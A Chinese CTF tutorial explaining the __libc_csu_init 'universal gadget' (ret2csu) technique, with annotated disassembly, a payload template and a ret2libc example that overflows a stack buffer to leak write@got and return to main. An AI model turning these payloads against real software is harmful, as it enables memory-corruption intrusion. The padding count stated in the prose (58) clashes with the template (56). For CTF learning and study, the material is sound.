【gadget】__libc_csu_init 里的”通用gadgets“

定义

这个函数是用来对 libc 进行初始化操作的，它的实现代码是写在elf文件里面的，所以就导致只要你是用动态链接glibc出的栈题，一般都是有这个通用gadget可以用的。

一般是这样的两种情况下不能用这个通用gadgets：

1、狼灭出题人，把所有要用到read、write这些C标准函数的地方改成用内联汇编方式自己写mov eax和syscall语句

2、静态链接程序

gadgets

  • gadgets1:带3参数的任意函数调用并ret2main

    【漏洞原理】

    其中主要的两段如下：

    .text:0000000000400600                 loc_400600:
.text:0000000000400600                 mov     rdx, r13
.text:0000000000400603                 mov     rsi, r14
.text:0000000000400606                 mov     edi, r15d
.text:0000000000400609                 call    qword ptr [r12+rbx*8]
.text:000000000040060D                 add     rbx, 1
.text:0000000000400611                 cmp     rbp, rbx
.text:0000000000400614                 jnz     short loc_400600

.text:0000000000400616                 loc_400616:                             ; CODE XREF: __libc_csu_init+34↑j
.text:0000000000400616                 add     rsp, 8
.text:000000000040061A                 pop     rbx
.text:000000000040061B                 pop     rbp
.text:000000000040061C                 pop     r12
.text:000000000040061E                 pop     r13
.text:0000000000400620                 pop     r14
.text:0000000000400622                 pop     r15
.text:0000000000400624                 retn

    对它的控制分为两个思想：

    1、控制函数执行

    我们可以先ret到第二段的000000000040061A（这里我们叫他“ppppppr_addr”）开始，控制r12+rbx*8的值为我们要跳转到的目标函数，r13、r14和r15分别为第三、第二、第一个传参，然后控制ret到0000000000400600（这里我们叫他“mmmc_addr”）

    这样就可以实现控制执行最多三个参数的函数

    2、控制函数执行后ret到我们想要的下一个劫持gadget

    函数执行后，就是ret到.text:000000000040060D add rbx, 1语句处，然后循环地执行loc_400600的这段代码，每个循环会让rbx++直到rbx=rbp才会跳出循坏来到loc_400616

    但是这个rbx和rbp都是可以在前面ret2ppppppr_addr时控制的，所以我们可以在那个时候直接控制rbx=0，rbp=1就可以让循环只执行一次就跳出到loc_400616

    跳出到loc_400616后还需要进行六次pop才到ret，加上前面的call会入栈一个返回地址，所以“这个六次pop后的ret的retaddr到我们第一次ret2mmmc_addr的retaddr”之间的偏移是7*8B，要在前面垫58个“A”

    【利用模板】

    可以实现控制3传参+函数执行，并且自定义retaddr

    mmmc_addr=...
ppppppr_addr=.....
payload=...+p64(ppppppr_addr)+p64(0)+p64(1)+p64(函数@got)+p64(传参3)+p64(传参2)+p64(传参1)+'A'*56+p64(下一个劫持gadget地址)

    【ret2libc模板】

    以一个x64的ret2libc可利用write泄漏libc基址题目为例：

    pop_addr = 0x40061a          
write_got = elf.got['write']
mov_addr = 0x400600
main_addr = elf.symbols['main']

payload0 = 'A'*136 + p64(pop_addr) + p64(0) + p64(1) + p64(write_got) + p64(8) + p64(write_got) + p64(1) + p64(mov_addr) #这里是程序通过溢出口ret到0x40061A然后一路pop到0x400624处ret到0x40600
payload0 += 'a'*(0x8+8*6) + p64(main_addr)#这里是read泄露完libc返回后，通过jne不跳后顺序下来执行0x40061A然后一路pop到0x400624处ret2main
p.sendline(payload0)

    在这一处中

    .text:0000000000400622                 pop     r15
.text:0000000000400624                 retn

    pop r15的硬编码是41 5F

    而5F又是pip rdi的硬编码，所以：

    0x400623处就是一个pop_rdi_ret的gadgets

    不过这个用ROPgadgets工具也可以扫出来，所以没有什么特别的
